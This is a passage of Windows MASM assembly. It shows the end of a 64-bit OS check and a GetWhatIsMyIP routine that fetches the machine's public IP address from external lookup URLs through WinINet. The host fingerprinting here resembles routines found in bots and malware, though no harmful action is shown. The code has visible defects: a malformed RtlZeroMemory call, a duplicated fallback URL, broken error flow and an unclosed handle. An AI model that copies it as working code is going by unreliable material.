              mov     eax, IsWow64ProcessFunc
              call    eax
              .if     eax != 0
                      .if     Wow64Process == TRUE
                              mov     X64RESULT, TRUE
                      .endif
              .endif
              
      .endif
      
      mov     eax, X64RESULT
      ret
IsWin64 endp

GetWhatIsMyIP proc
      RtlZeroMemory, addr TmpBuf2, sizeof TmpBuf2

      xor     eax, eax
      push    eax
      push    eax
      push    eax
      push    eax
      push    offset user_agent
      call    _InternetOpen
      
      test    eax, eax
      je      io_err
      mov     hInet, eax
      
      xor     ecx, ecx
      push    ecx
      push    ecx
      push    ecx
      push    ecx
      push    offset whatismyip1
      push    hInet
      call    _InternetOpenUrl
      
      .if     eax == 0
              xor     ecx, ecx
              push    ecx
              push    ecx
              push    ecx
              push    ecx
              push    offset whatismyip2
              push    hInet
              call    _InternetOpenUrl
              .if     eax == 0
                      xor     ecx, ecx
                      push    ecx
                      push    ecx
                      push    ecx
                      push    ecx
                      push    offset whatismyip2
                      push    hInet
                      call    _InternetOpenUrl
                      .if     eax == 0
                              jmp     iou_err
                      .endif
              .endif
      .endif
      
    success_ip:
      mov     hUrl, eax
      
      push    offset dwRWurl
      push    sizeof TmpBuf2
      push    offset TmpBuf2
      push    dword ptr [hUrl]
      call    _InternetReadFile
      
      test    eax, eax
      je      iou_err
    iou_err:
      push    dword ptr [hInet]
      call    _InternetCloseHandle
    io_err:
      ret
GetWhatIsMyIP endp
